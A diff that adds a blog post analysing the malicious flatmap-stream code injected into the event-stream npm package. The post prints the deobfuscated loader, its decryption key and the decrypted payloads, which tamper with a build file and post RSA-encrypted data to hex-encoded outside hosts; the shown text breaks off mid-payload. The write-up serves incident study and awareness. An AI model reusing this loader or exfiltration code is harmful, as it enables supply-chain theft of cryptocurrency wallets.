@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang=en>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="A few weeks ago, this issue was opened on a popular Node NPM package called Event Stream. This package enables Node streams to be simpler and streamlines many I/O operations within Node. Regardless, t">
+<meta name="keywords" content="Cryptography">
+<meta property="og:type" content="article">
+<meta property="og:title" content="To Catch A Hacker - NPM Event Stream">
+<meta property="og:url" content="johncodes.com/2018/12/14/to_catch_a_hacker/index.html">
+<meta property="og:site_name" content="John McBride">
+<meta property="og:description" content="A few weeks ago, this issue was opened on a popular Node NPM package called Event Stream. This package enables Node streams to be simpler and streamlines many I/O operations within Node. Regardless, t">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2020-09-01T16:32:44.181Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="To Catch A Hacker - NPM Event Stream">
+<meta name="twitter:description" content="A few weeks ago, this issue was opened on a popular Node NPM package called Event Stream. This package enables Node streams to be simpler and streamlines many I/O operations within Node. Regardless, t">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>To Catch A Hacker - NPM Event Stream</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/jpmcb">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/01/21/slack_owner_is_watching/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/11/16/super_vim_tips/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=johncodes.com/2018/12/14/to_catch_a_hacker/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=johncodes.com/2018/12/14/to_catch_a_hacker/&text=To Catch A Hacker - NPM Event Stream"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=johncodes.com/2018/12/14/to_catch_a_hacker/&title=To Catch A Hacker - NPM Event Stream"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=johncodes.com/2018/12/14/to_catch_a_hacker/&is_video=false&description=To Catch A Hacker - NPM Event Stream"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=To Catch A Hacker - NPM Event Stream&body=Check out this article: johncodes.com/2018/12/14/to_catch_a_hacker/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=johncodes.com/2018/12/14/to_catch_a_hacker/&title=To Catch A Hacker - NPM Event Stream"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=johncodes.com/2018/12/14/to_catch_a_hacker/&title=To Catch A Hacker - NPM Event Stream"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=johncodes.com/2018/12/14/to_catch_a_hacker/&title=To Catch A Hacker - NPM Event Stream"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=johncodes.com/2018/12/14/to_catch_a_hacker/&title=To Catch A Hacker - NPM Event Stream"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=johncodes.com/2018/12/14/to_catch_a_hacker/&name=To Catch A Hacker - NPM Event Stream&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=johncodes.com/2018/12/14/to_catch_a_hacker/&t=To Catch A Hacker - NPM Event Stream"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Malicious-Code"><span class="toc-number">1.</span> <span class="toc-text">The Malicious Code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Brute-Force-a-Solution"><span class="toc-number">2.</span> <span class="toc-text">Brute Force a Solution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Aftermath"><span class="toc-number">3.</span> <span class="toc-text">Aftermath</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Community-Standards"><span class="toc-number">4.</span> <span class="toc-text">Community Standards</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Should-I-Trust-You"><span class="toc-number">5.</span> <span class="toc-text">Should I Trust You?</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        To Catch A Hacker - NPM Event Stream
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">John McBride</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-12-14T07:00:00.000Z" itemprop="datePublished">2018-12-14</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Software-Engineering/">Software Engineering</a> › <a class="category-link" href="/categories/Software-Engineering/Security/">Security</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Cryptography/">Cryptography</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>A few weeks ago, <a href="https://github.com/dominictarr/event-stream/issues/116" target="_blank" rel="noopener">this</a> issue was opened on a popular Node NPM package called <em>Event Stream</em>. This package enables Node streams to be simpler and streamlines many I/O operations within Node. Regardless, this package is a key dependency for many other Node packages and has over 1 million downloads per week from NPM. The newly opened issue initially questioned a new, suspicious dependency that was pushed by a new, unknown maintainer. I was lucky enough to follow the community’s investigation into this issue and now, I hope to present the findings here. My goal with this piece is to hopefully shed some light on how easy it is for somebody to inject malicious code into NPM packages, the responsibility of open source maintainers, and the responsibility of the community.</p>
+<h2 id="The-Malicious-Code"><a href="#The-Malicious-Code" class="headerlink" title="The Malicious Code"></a>The Malicious Code</h2><p>A Github user noticed that a new dependency named <em>flatmap-stream</em> was added to the event stream module. Through some investigative work, here is the raw code (un-minified by Github user <a href="https://github.com/FallingSnow" target="_blank" rel="noopener">FallingSnow</a>) that was injected through flatmap. The flatmap module was an unknown, single author module.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// var r = require, t = process;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// function e(r) &#123;</span></span><br><span class="line"><span class="comment">//     return Buffer.from(r, "hex").toString()</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Buffer.from(data, <span class="string">"hex"</span>).toString()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// var n = r(e("2e2f746573742f64617461")),</span></span><br><span class="line"><span class="comment">// var n = require(decode("2e2f746573742f64617461"))</span></span><br><span class="line"><span class="comment">// var n = require('./test/data')</span></span><br><span class="line"><span class="keyword">var</span> n = [<span class="string">"75d4c87f3f69e0fa292969072c49dff4f90f44c1385d8eb60dae4cc3a229e52cf61f78b0822353b4304e323ad563bc22c98421eb6a8c1917e30277f716452ee8d57f9838e00f0c4e4ebd7818653f00e72888a4031676d8e2a80ca3cb00a7396ae3d140135d97c6db00cab172cbf9a92d0b9fb0f73ff2ee4d38c7f6f4b30990f2c97ef39ae6ac6c828f5892dd8457ab530a519cd236ebd51e1703bcfca8f9441c2664903af7e527c420d9263f4af58ccb5843187aa0da1cbb4b6aedfd1bdc6faf32f38a885628612660af8630597969125c917dfc512c53453c96c143a2a058ba91bc37e265b44c5874e594caaf53961c82904a95f1dd33b94e4dd1d00e9878f66dafc55fa6f2f77ec7e7e8fe28e4f959eab4707557b263ec74b2764033cd343199eeb6140a6284cb009a09b143dce784c2cd40dc320777deea6fbdf183f787fa7dd3ce2139999343b488a4f5bcf3743eecf0d30928727025ff3549808f7f711c9f7614148cf43c8aa7ce9b3fcc1cff4bb0df75cb2021d0f4afe5784fa80fed245ee3f0911762fffbc36951a78457b94629f067c1f12927cdf97699656f4a2c4429f1279c4ebacde10fa7a6f5c44b14bc88322a3f06bb0847f0456e630888e5b6c3f2b8f8489cd6bc082c8063eb03dd665badaf2a020f1448f3ae268c8d176e1d80cc756dc3fa02204e7a2f74b9da97f95644792ee87f1471b4c0d735589fc58b5c98fb21c8a8db551b90ce60d88e3f756cc6c8c4094aeaa12b149463a612ea5ea5425e43f223eb8071d7b991cfdf4ed59a96ccbe5bdb373d8febd00f8c7effa57f06116d850c2d9892582724b3585f1d71de83d54797a0bfceeb4670982232800a9b695d824a7ada3d41e568ecaa6629"</span>,<span class="string">"db67fdbfc39c249c6f338194555a41928413b792ff41855e27752e227ba81571483c631bc659563d071bf39277ac3316bd2e1fd865d5ba0be0bbbef3080eb5f6dfdf43b4a678685aa65f30128f8f36633f05285af182be8efe34a2a8f6c9c6663d4af8414baaccd490d6e577b6b57bf7f4d9de5c71ee6bbffd70015a768218a991e1719b5428354d10449f41bac70e5afb1a3e03a52b89a19d4cc333e43b677f4ec750bf0be23fb50f235dd6019058fbc3077c01d013142d9018b076698536d2536b7a1a6a48f5485871f7dc487419e862b1a7493d840f14e8070c8eff54da8013fd3fe103db2ecebc121f82919efb697c2c47f79516708def7accd883d980d5618efd408c0fd46fd387911d1e72e16cf8842c5fe3477e4b46aa7bb34e3cf9caddfca744b6a21b5457beaccff83fa6fb6e8f3876e4764e0d4b5318e7f3eed34af757eb240615591d5369d4ab1493c8a9c366dfa3981b92405e5ebcbfd5dca2c6f9b8e8890a4635254e1bc26d2f7a986e29fef6e67f9a55b6faec78d54eb08cb2f8ea785713b2ffd694e7562cf2b06d38a0f97d0b546b9a121620b7f9d9ccca51b5e74df4bdd82d2a5e336a1d6452912650cc2e8ffc41bd7aa17ab17f60b2bd0cfc0c35ed82c71c0662980f1242c4523fae7a85ccd5e821fe239bfb33d38df78099fd34f429d75117e39b888344d57290b21732f267c22681e4f640bec9437b756d3002a3135564f1c5947cc7c96e1370db7af6db24c9030fb216d0ac1d9b2ca17cb3b3d5955ffcc3237973685a2c078e10bc6e36717b1324022c8840b9a755cffdef6a4d1880a4b6072fd1eb7aabebb9b949e1e37be6dfb6437c3fd0e6f135bcea65e2a06eb35ff26dcf2b2772f8d0cde8e5fa5eec577e9754f6b044502f8ce8838d36827bd3fe91cccba2a04c3ee90c133352cbad34951fdf21a671a4e3940fd69cfee172df4123a0f678154871afa80f763d78df971a1317200d0ce5304b3f01ace921ea8afb41ec800ab834d81740353101408733fb710e99657554c50a4a8cb0a51477a07d6870b681cdc0be0600d912a0c711dc9442260265d50e269f02eb49da509592e0996d02a36a0ce040fff7bd3be57e97d07e4de0cdb93b7e3ccea422a5a526fb95ea8508ea2a40010f56d4aa96da23e6e9bcbae09dacccdcd8ac6af96a1922266c3795fb0798affaa75b8ae05221612ce45c824d1f6603fe2afd74b9e167736bfffe01a12b9f85912572a291336c693f133efeac881cd09207505ad93967e3b7a8972cdcce208bfa3b9956370795791ca91a8b9deabde26c3ee2adb43e9f7df2df16d4582a4e610b73754e609b1eea936a4d916bf5ed9d627692bcc8ed0933026e9250d16bdaf2b68470608aeaffedcf2be8c4c176bfc620e3f9f17a4a9d8ef9fe46cca41a79878d37423c0fa9f3ee1f4e6d68f029d6cbb5cbc90e7243135e0fc1dd66297d32adabc9a6d0235709be173b688ba2004f518f58f5459caca60d615ae4dc0d0eeacbe48ca8727a8b42dc78396316a0e223029b76311e7607ea5bd236307ba3b62afeff7a1ef5c0b5d7ee760c0f6472359c57817c5d9cd534d9a34bb4847bbc83c37b14b6444e9f386f1bec4b42c65d1078d54bd007ff545028205099abc454919406408b761a1636d10e39ede9f650f25abad3219b9d46d535402b930488535d97d19be3b0e75fed31d0b2f8af099481685e2b4fa9bff05cbac1b9b405db2c7eae68501633e02723560727a1c8c34c32afc76cdeb82fe8bae34b09cd82402076b9f481d043b080d851c7b6ba8613adba3bc3d5edb9a84fce41130ad328fe4c062a76966cb60c4fa801f359d22b70a797a2c2a3d19da7383025cb2e076b9c30b862456ae4b60197101e82133748c224a1431545fde146d98723ccb79b47155b218914c76f5d52027c06c6c913450fc56527a34c3fe1349f38018a55910de819add6204ab2829668ca0b7afb0d00f00c873a3f18daad9ae662b09c775cddbe98b9e7a43f1f8318665027636d1de18b5a77f548e9ede3b73e3777c44ec962fb7a94c56d8b34c1da603b3fc250799aad48cc007263daf8969dbe9f8ade2ac66f5b66657d8b56050ff14d8f759dd2c7c0411d92157531cfc3ac9c981e327fd6b140fb2abf994fa91aecc2c4fef5f210f52d487f117873df6e847769c06db7f8642cd2426b6ce00d6218413fdbba5bbbebc4e94bffdef6985a0e800132fe5821e62f2c1d79ddb5656bd5102176d33d79cf4560453ca7fd3d3c3be0190ae356efaaf5e2892f0d80c437eade2d28698148e72fbe17f1fac993a1314052345b701d65bb0ea3710145df687bb17182cd3ad6c121afef20bf02e0100fd63cbbf498321795372398c983eb31f184fa1adbb24759e395def34e1a726c3604591b67928da6c6a8c5f96808edfc7990a585411ffe633bae6a3ed6c132b1547237cab6f3b24c57d3d4cd8e2fbbd9f7674ececf0f66b39c2591330acc1ac20732a98e9b61a3fd979f88ab7211acbf629fcb0c80fb5ed1ea55df0735dcf13510304652763a5ed7bde3e5ebda1bf72110789ebefa469b70f6b4add29ce1471fa6972df108717100412c804efcf8aaba277f0107b1c51f15f144ab02dd8f334d5b48caf24a4492979fa425c4c25c4d213408ecfeb82f34e7d20f26f65fa4e89db57582d6a928914ee6fc0c6cc0a9793aa032883ea5a2d2135dbfcf762f4a2e22585966be376d30fbfabb1dfd182e7b174097481763c04f5d7cbd060c5a36dc0e3dd235de1669f3db8747d5b74d8c1cc9ab3a919e257fb7e6809f15ab7c2506437ced02f03416a1240a555f842a11cde514c450a2f8536f25c60bbe0e1b013d8dd407e4cb171216e30835af7ca0d9e3ff33451c6236704b814c800ecc6833a0e66cd2c487862172bc8a1acb7786ddc4e05ba4e41ada15e0d6334a8bf51373722c26b96bbe4d704386469752d2cda5ca73f7399ff0df165abb720810a4dc19f76ca748a34cb3d0f9b0d800d7657f702284c6e818080d4d9c6fff481f76fb7a7c5d513eae7aa84484822f98a183e192f71ea4e53a45415ddb03039549b18bc6e1"</span>,<span class="string">"63727970746f"</span>,<span class="string">"656e76"</span>,<span class="string">"6e706d5f7061636b6167655f6465736372697074696f6e"</span>,<span class="string">"616573323536"</span>,<span class="string">"6372656174654465636970686572"</span>,<span class="string">"5f636f6d70696c65"</span>,<span class="string">"686578"</span>,<span class="string">"75746638"</span>]</span><br><span class="line">    <span class="comment">// o = t[e(n[3])][e(n[4])];</span></span><br><span class="line">    <span class="comment">// npm_package_description = process[decode(n[3])][decode(n[4])];</span></span><br><span class="line">    <span class="comment">// npm_package_description = process['env']['npm_package_description'];</span></span><br><span class="line">    npm_package_description = <span class="string">'Get all children of a pid'</span>; <span class="comment">// Description from ps-tree (this is the aes decryption key)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// if (!o) return;</span></span><br><span class="line"><span class="keyword">if</span> (!npm_package_description) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// var u = r(e(n[2]))[e(n[6])](e(n[5]), o),</span></span><br><span class="line"><span class="comment">// var decipher = require(decode(n[2]))[decode(n[6])](decode(n[5]), npm_package_description),</span></span><br><span class="line"><span class="keyword">var</span> decipher = <span class="built_in">require</span>(<span class="string">'crypto'</span>)[<span class="string">'createDecipher'</span>](<span class="string">'aes256'</span>, npm_package_description),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// a = u.update(n[0], e(n[8]), e(n[9]));</span></span><br><span class="line">    <span class="comment">// decoded = decipher.update(n[0], e(n[8]), e(n[9]));</span></span><br><span class="line">    decoded = decipher.update(n[<span class="number">0</span>], <span class="string">'hex'</span>, <span class="string">'utf8'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(n);</span><br><span class="line"></span><br><span class="line"><span class="comment">// a += u.final(e(n[9]));</span></span><br><span class="line">decoded += decipher.final(<span class="string">'utf8'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// var f = new module.constructor;</span></span><br><span class="line"><span class="keyword">var</span> newModule = <span class="keyword">new</span> <span class="built_in">module</span>.constructor;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**************** DO NOT UNCOMMENT [THIS RUNS THE CODE] **************/</span></span><br><span class="line"><span class="comment">// f.paths = module.paths, f[e(n[7])](a, ""), f.exports(n[1])</span></span><br><span class="line"><span class="comment">// newModule.paths = module.paths, newModule['_compile'](decoded, ""), newModule.exports(n[1])</span></span><br><span class="line"><span class="comment">// newModule.paths = module.paths</span></span><br><span class="line"><span class="comment">// newModule['_compile'](decoded, "") // Module.prototype._compile = function(content, filename)</span></span><br><span class="line"><span class="comment">// newModule.exports(n[1])</span></span><br></pre></td></tr></table></figure>
+<p>As we can see, this is a fairly messy bit of code (as it had to be converted from mini-js to readable Node code). Also, the reader should note that there are some additional comments provided by FallingSnow, specifically the last bit. Caution! Do not run the last bit of code. You can simply use the above code to decrypt and see the injection attack. </p>
+<p>The biggest thing that tips us off to this being malicious is the long stream of encrypted characters that are latter decrypted and used in a <code>exports</code> statement, effectively “compiling” and running whatever is held in the encrypted block. Further, we can see that the <code>n</code> variable holds an array of 2 separate strings. And finally, in the last block, we can see that the decrypted string from the <code>n</code> variable is used with a ‘_compile’ statement, effectively running whatever parsed JavaScript might be held within the string.</p>
+<h2 id="Brute-Force-a-Solution"><a href="#Brute-Force-a-Solution" class="headerlink" title="Brute Force a Solution"></a>Brute Force a Solution</h2><p>Now, the key to deciphering the encrypted text depends directly on the <code>npm_package_description</code> variable, as we can see it is being used as the key in the <code>createDecipher</code> method. The initial thought from the community was that this key must be from the event stream <code>package.json</code> file itself (since the node runtime environment would set the modules description). However, this proved to not be the correct key and several Github users noted that it is possible to manually set a modules description from within the code. So, in order to find out what this injection attack is doing, we have to find the matching NPM package description. </p>
+<p>Eventually, the community was able to find a listing of all public NPM package descriptions and brute force a solution out of this long list of descriptions. Brute forcing the solution out of public NPM package descriptions was a clever way to eventually land on the right key. Since the variable name is descriptive enough, we can effectively narrow it down from an infinite number of possibilities to only strings that are NPM package descriptions. If the key’s variable name hadn’t been as pronounced, it would have been more challenge to find the key. The correct key is as follows and comes from the copay-dash NPM module:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm_package_description = <span class="string">'A Secure Bitcoin Wallet'</span>;</span><br></pre></td></tr></table></figure>
+<p>Using this as the key, we can see the decrypted code is as follows, in the two seperate payloads:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*@@*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="regexp">/build\:.*\-release/</span>.test(process.argv[<span class="number">2</span>])) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">var</span> t = process.env.npm_package_description,</span><br><span class="line">            r = <span class="built_in">require</span>(<span class="string">"fs"</span>),</span><br><span class="line">            i = <span class="string">"./node_modules/@zxing/library/esm5/core/common/reedsolomon/ReedSolomonDecoder.js"</span>,</span><br><span class="line">            n = r.statSync(i),</span><br><span class="line">            c = r.readFileSync(i, <span class="string">"utf8"</span>),</span><br><span class="line">            o = <span class="built_in">require</span>(<span class="string">"crypto"</span>).createDecipher(<span class="string">"aes256"</span>, t),</span><br><span class="line">            s = o.update(e, <span class="string">"hex"</span>, <span class="string">"utf8"</span>);</span><br><span class="line">        s = <span class="string">"\n"</span> + (s += o.final(<span class="string">"utf8"</span>));</span><br><span class="line">        <span class="keyword">var</span> a = c.indexOf(<span class="string">"\n/*@@*/"</span>);</span><br><span class="line">        <span class="number">0</span> &lt;= a &amp;&amp; (c = c.substr(<span class="number">0</span>, a)), r.writeFileSync(i, c + s, <span class="string">"utf8"</span>), r.utimesSync(i, n.atime, n.mtime), process.on(<span class="string">"exit"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                r.writeFileSync(i, c, <span class="string">"utf8"</span>), r.utimesSync(i, n.atime, n.mtime)</span><br><span class="line">            &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*@@*/</span> ! <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> o = <span class="built_in">require</span>(<span class="string">"http"</span>),</span><br><span class="line">                a = <span class="built_in">require</span>(<span class="string">"crypto"</span>),</span><br><span class="line">                c = <span class="string">"-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\\nDXUs/peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+/BiGud7b77Fwfq372fUuEIk\\n2P/pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\\nPDBMwQsCKQcpKDXw/6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl/cJ/x76To\\n2wIDAQAB\\n-----END PUBLIC KEY-----"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params">e, t, n</span>) </span>&#123;</span><br><span class="line">                e = Buffer.from(e, <span class="string">"hex"</span>).toString();</span><br><span class="line">                <span class="keyword">var</span> r = o.request(&#123;</span><br><span class="line">                    hostname: e,</span><br><span class="line">                    port: <span class="number">8080</span>,</span><br><span class="line">                    method: <span class="string">"POST"</span>,</span><br><span class="line">                    path: <span class="string">"/"</span> + t,</span><br><span class="line">                    headers: &#123;</span><br><span class="line">                        <span class="string">"Content-Length"</span>: n.length,</span><br><span class="line">                        <span class="string">"Content-Type"</span>: <span class="string">"text/html"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;);</span><br><span class="line">                r.on(<span class="string">"error"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;&#125;), r.write(n), r.end()</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params">e, t</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="string">""</span>, r = <span class="number">0</span>; r &lt; t.length; r += <span class="number">200</span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> o = t.substr(r, <span class="number">200</span>);</span><br><span class="line">                    n += a.publicEncrypt(c, Buffer.from(o, <span class="string">"utf8"</span>)).toString(<span class="string">"hex"</span>) + <span class="string">"+"</span></span><br><span class="line">                &#125;</span><br><span class="line">                i(<span class="string">"636f7061796170692e686f7374"</span>, e, n), i(<span class="string">"3131312e39302e3135312e313334"</span>, e, n)</span><br><span class="line">            &#125;</span><br><span 